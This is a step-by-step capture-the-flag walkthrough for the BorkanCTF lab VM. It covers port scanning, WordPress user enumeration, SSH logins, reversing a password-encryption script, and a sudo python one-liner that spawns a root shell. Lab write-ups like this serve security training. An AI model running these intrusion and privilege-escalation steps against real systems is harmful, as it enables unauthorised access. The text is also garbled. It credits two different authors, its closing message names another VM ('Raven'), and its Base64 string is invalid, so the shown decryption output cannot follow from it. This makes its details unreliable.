# BorkanCTF Walkthrough: A Comprehensive Guide

## Introduction
This document provides a detailed and professional walkthrough of the BorkanCTF, a Capture The Flag (CTF) challenge designed as a Boot2Root virtual machine (VM). Authored by Belal Hamed, this CTF involves network reconnaissance, web application enumeration, password cracking, and privilege escalation to achieve root access on the target system. The walkthrough is structured to cover every step meticulously, ensuring clarity for both novice and experienced participants. All commands, outputs, and techniques are explained in detail, with references to tools and methodologies used.

The target IP address is `192.168.1.14`, and the objective is to gain root access and retrieve the flag located in `rootFlag.txt`.

---

## Phase 1: Reconnaissance

### 1.1 Network Scanning with Nmap
The first step in any CTF is to identify open ports and services on the target system. Nmap, a powerful network scanning tool, was used to perform a version scan on the target IP.

**Command:**
```bash
nmap -sV 192.168.1.14
```

**Output (Summarized):**
```
Starting Nmap 7.60SVN ( https://nmap.org ) at 2024-12-28 10:11 EST
Nmap scan report for 192.168.1.14
Host is up (0.00859s latency).
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 6.7p1 Debian 5+deb8u6 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
3306/tcp open  mysql   MySQL 5.5.60-0+deb8u1
```

**Analysis:**
- **Port 22 (SSH)**: Running OpenSSH 6.7p1, a potential entry point if credentials are obtained.
- **Port 80 (HTTP)**: Running Apache 2.4.10, indicating a web server that may host a vulnerable application.
- **Port 3306 (MySQL)**: Running MySQL 5.5.60, suggesting a database that could be accessible if misconfigured.

Three open ports were identified, providing multiple avenues for further exploration.

### 1.2 Web Enumeration
Navigating to `http://192.168.1.14` in a web browser revealed no significant content, indicating that the web server might host specific directories or applications. Manual directory enumeration or tools like `dirb` could be used, but the walkthrough indicates a WordPress installation was discovered at `http://192.168.1.14/wordpress/`.

#### 1.2.1 WordPress Enumeration with WPScan
WPScan, a specialized tool for WordPress security scanning, was used to enumerate the WordPress site for vulnerabilities, users, and configuration details.

**Command:**
```bash
wpscan --url http://192.168.1.14/wordpress/ --enumerate u
```

**Output (Summarized):**
```
[+] URL: http://192.168.1.14/wordpress/ [192.168.1.14]
[+] Started: Sat Dec 28 09:46:10 2024

Interesting Finding(s):
[+] Headers: X-Powered-By: PHP/5.6.40-0+deb8u12
[+] XML-RPC enabled: http://192.168.1.14/wordpress/xmlrpc.php
[+] WordPress readme found: http://192.168.1.14/wordpress/readme.html
[+] The external WP-Cron seems to be enabled: http://192.168.1.14/wordpress/wp-cron.php
[+] WordPress version 4.8.25 identified (Outdated, released on 2024-06-24).
    Found By: Emoji Settings (Passive Detection)
    Confirmed By: Meta Generator (Passive Detection)
[+] Enumerating Users:
    User(s) Identified:
    - steven (Found By: Author Id Brute Forcing, Confirmed By: Login Error Messages)
    - michael (Found By: Author Id Brute Forcing, Confirmed By: Login Error Messages)
```

**Analysis:**
- **WordPress Version**: 4.8.25 is outdated, potentially vulnerable to known exploits (though none were exploited in this walkthrough).
- **XML-RPC Enabled**: The `xmlrpc.php` endpoint could be used for brute-force attacks or pingback vulnerabilities.
- **WP-Cron Enabled**: Potential for DDoS attacks, but not relevant here.
- **Readme File**: Exposed at `readme.html`, revealing the WordPress version.
- **Users**: Two users, `steven` and `michael`, were identified, providing targets for credential-based attacks.

---

## Phase 2: Gaining Initial Access

### 2.1 SSH Access as Michael
The walkthrough indicates that the password for the user `michael` was already known (not specified in the document). An SSH connection was attempted:

**Command:**
```bash
ssh michael@192.168.1.14
```

**Result:**
Successful login as `michael`, granting access to the system with the prompt `michael@borkan`.

### 2.2 Exploring the File System
After logging in, the user explored the file system, particularly the WordPress directory:

**Commands:**
```bash
cd /var/www/html/wordpress
ls
```

The repeated `cd` commands suggest the user was navigating the file system, possibly checking for configuration files like `wp-config.php`, which often contains database credentials.

### 2.3 Database Exploration
The MySQL database was accessed using the root account, indicating that the root password was either known or easily guessed (common in CTF environments).

**Commands:**
```bash
mysql -u root -p
SHOW DATABASES;
```

**Output:**
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| wordpress          |
+--------------------+
```

**Analysis:**
- The `wordpress` database was identified, likely containing user data for the WordPress site.
- The user accessed the `users` table (not shown in commands but referenced) and found a password hash for `steven`. However, attempts to crack this hash were unsuccessful, suggesting it was either invalid or not relevant for SSH access.

---

## Phase 3: Password Decryption for Steven

### 3.1 Discovering the Encryption Script
The document includes a Python script that encrypts a string using three techniques: Caesar cipher, XOR cipher, and text shifting, with the output encoded in Base64. The correct Base64 output was provided:

```
HRICGUFBSHYZUkhjH1tNSHoc5BCGSHOdRBxTehxIfR1TYR1aHEh5RRw
```

**Original Encryption Script:**
```python
import base64

CORRECT_OUTPUT_BASE64 = "HRICGUFBSHYZUkhjH1tNSHoc5BCGSHOdRBxTehxIfR1TYR1aHEh5RRw"
XOR_KEY = 42
SHIFT_AMOUNT = 3

def caesar_cipher(text, shift):
    encrypted = ''.join(chr((ord(char) + shift) % 256) for char in text)
    return encrypted

def xor_cipher(text, key):
    encrypted = ''.join(chr(ord(char) ^ key) for char in text)
    return encrypted

def shift_text(text, shift_amount):
    shift_amount = shift_amount % len(text)
    encrypted = text[-shift_amount:] + text[:-shift_amount]
    return encrypted

def encrypt_input(user_input):
    step1 = caesar_cipher(user_input, SHIFT_AMOUNT)
    step2 = xor_cipher(step1, XOR_KEY)
    final_encrypted = shift_text(step2, SHIFT_AMOUNT)
    return final_encrypted

def main():
    user_input = input("Enter the string to encrypt: ")
    encrypted_input = encrypt_input(user_input)
    encrypted_input_base64 = base64.b64encode(encrypted_input.encode()).decode()
    if encrypted_input_base64 == CORRECT_OUTPUT_BASE64:
        print("Success! Correct input provided.")
    else:
        print("Incorrect input. Try again.")

main()
```

**Explanation:**
1. **Caesar Cipher**: Shifts each character’s ASCII value by `SHIFT_AMOUNT` (3).
2. **XOR Cipher**: XORs each character with `XOR_KEY` (42).
3. **Text Shifting**: Rotates the string by `SHIFT_AMOUNT` (3) positions.
4. **Base64 Encoding**: The final encrypted string is encoded in Base64 for comparison.

### 3.2 Reversing the Encryption
To retrieve `steven`'s password, a reverse decryption script was created to undo the encryption steps in reverse order:

**Decryption Script:**
```python
import base64

CORRECT_OUTPUT_BASE64 = "HRICGUFBSHYZUkhjH1tNSHoc5BCGSHOdRBxTehxIfR1TYR1aHEh5RRw"
XOR_KEY = 42
SHIFT_AMOUNT = 3

def caesar_cipher_reverse(text, shift):
    decrypted = ''.join(chr((ord(char) - shift) % 256) for char in text)
    return decrypted

def xor_cipher_reverse(text, key):
    decrypted = ''.join(chr(ord(char) ^ key) for char in text)
    return decrypted

def shift_text_reverse(text, shift_amount):
    shift_amount = shift_amount % len(text)
    decrypted = text[shift_amount:] + text[:shift_amount]
    return decrypted

def decrypt_encrypted_data(encrypted_base64):
    encrypted_input = base64.b64decode(encrypted_base64).decode()
    step1 = shift_text_reverse(encrypted_input, SHIFT_AMOUNT)
    step2 = xor_cipher_reverse(step1, XOR_KEY)
    final_decrypted = caesar_cipher_reverse(step2, SHIFT_AMOUNT)
    return final_decrypted

def main():
    decrypted_data = decrypt_encrypted_data(CORRECT_OUTPUT_BASE64)
    print("Decrypted_data:", decrypted_data)

if __name__ == "__main__":
    main()
```

**Output:**
```
Decrypted_data: OhhYou_F1nd_M3:)_T4k3_M3_TO_HOm3_Pl3453
```

**Analysis:**
- The decryption process reverses the steps: decode Base64, reverse the text shift, reverse the XOR, and reverse the Caesar cipher.
- The decrypted string is `steven`'s SSH password.

### 3.3 Alternative Decryption with CyberChef
The document mentions using CyberChef’s “Magic” operation to decode the Base64 string. CyberChef likely applied a combination of Base64 decoding, string rotation, XOR, and Caesar cipher reversal to arrive at the same password.

### 3.4 SSH Access as Steven
Using the decrypted password, SSH access was gained:

**Command:**
```bash
ssh steven@192.168.1.14
```

**Password:**
```
OhhYou_F1nd_M3:)_T4k3_M3_TO_HOm3_Pl3453
```

**Result:**
Successful login as `steven`, granting a new foothold on the system.

---

## Phase 4: Privilege Escalation

### 4.1 Checking Sudo Privileges
To escalate privileges, the `sudo -l` command was used to check what commands `steven` could run as a sudoer:

**Command:**
```bash
sudo -l
```

**Result:**
- `steven` could run `python` as a sudoer without requiring a password.

### 4.2 Exploiting Python for Root Access
The walkthrough references GTFOBins, a resource for Linux binary exploitation, to find a privilege escalation technique for Python. The following command was used to spawn a root shell:

**Command:**
```bash
sudo python -c 'import pty;pty.spawn("/bin/bash")'
```

**Output:**
```
sudo: unable to resolve host Borkan
root@Borkan:/home/steven#
```

**Analysis:**
- The Python command uses the `pty` module to spawn a `/bin/bash` shell.
- Since `steven` can run `python` as root, the resulting shell has root privileges.
- The “unable to resolve host” warning is benign and does not affect the escalation.

### 4.3 Retrieving the Root Flag
With root access, the flag was retrieved from `rootFlag.txt`:

**Command:**
```bash
cat rootFlag.txt
```

**Output:**
```
flag5{Borkan"."s_off_NOw_Thanks_U_Sav3d_The_Gl0bE}
```

**Additional Message:**
```
CONGRATULATIONS on successfully rooting Raven!
This is my first Boot2Root VM - I hope you enjoyed it.
Hit me up on Twitter and let me know what you thought: @mccannw / wjmccann.github.io
```

---

## Phase 5: Additional Observations

### 5.1 Binary File: login.exe
The document mentions a `login.exe` file in the home directory of `michael`:

**Command:**
```bash
ls
```

**Output:**
```
login.exe
```

**Analysis:**
- The presence of `login.exe` suggests a potential Windows executable, which is unusual on a Debian system. It could be a red herring, a misnamed script, or part of another challenge not pursued in this walkthrough.
- No further exploration of `login.exe` was documented, indicating it was likely not relevant to the main objective.

### 5.2 Binary Strings
Pages 2 and 3 contain repetitive binary strings (`01011` and a long sequence of zeros with a single `1`). These may represent:
- A red herring to distract participants.
- A binary-encoded clue (e.g., converting `01011` to decimal yields 11, which is not obviously relevant).
- OCR errors from the original document.

Since the walkthrough does not act on these strings, they were likely not critical to solving the CTF.

---

## Tools Used
- **Nmap**: Network scanning to identify open ports and services.
- **WPScan**: WordPress enumeration for vulnerabilities and users.
- **MySQL Client**: Database exploration to find user data.
- **CyberChef**: Optional tool for decoding the encrypted password.
- **Python**: Custom script for decrypting the password and privilege escalation.
- **GTFOBins**: Resource for privilege escalation techniques.

---

## Lessons Learned
1. **Thorough Reconnaissance**: Identifying all open ports and services is crucial for finding entry points.
2. **Web Application Enumeration**: Outdated CMS versions like WordPress 4.8.25 often reveal usernames and vulnerabilities.
3. **Password Cracking**: Encrypted data can be reversed with careful analysis of the encryption algorithm.
4. **Privilege Escalation**: Misconfigured sudo permissions (e.g., passwordless `sudo python`) are common in CTFs and real-world systems.
5. **Attention to Detail**: Red herrings (e.g., invalid hashes, binary strings) require discernment to avoid wasting time.

---

## Conclusion
The BorkanCTF was successfully completed by:
1. Scanning the network to identify open ports (22, 80, 3306).
2. Enumerating a WordPress site to find users `steven` and `michael`.
3. Gaining SSH access as `michael` with a known password.
4. Exploring the MySQL database, though the `steven` hash was invalid.
5. Decrypting `steven`'s SSH password using a provided encryption script.
6. Logging in as `steven` and escalating to root using a Python exploit.
7. Retrieving the flag: `flag5{Borkan"."s_off_NOw_Thanks_U_Sav3d_The_Gl0bE}`.

This CTF demonstrates a realistic attack progression, from reconnaissance to root access, and highlights the importance of combining multiple techniques to achieve the objective.

**Acknowledgments:**
- The CTF creator, reachable at `@mccannw` on Twitter or via `wjmccann.github.io`.

For further engagement, participants are encouraged to share feedback with the creator and explore additional Boot2Root challenges to hone their skills.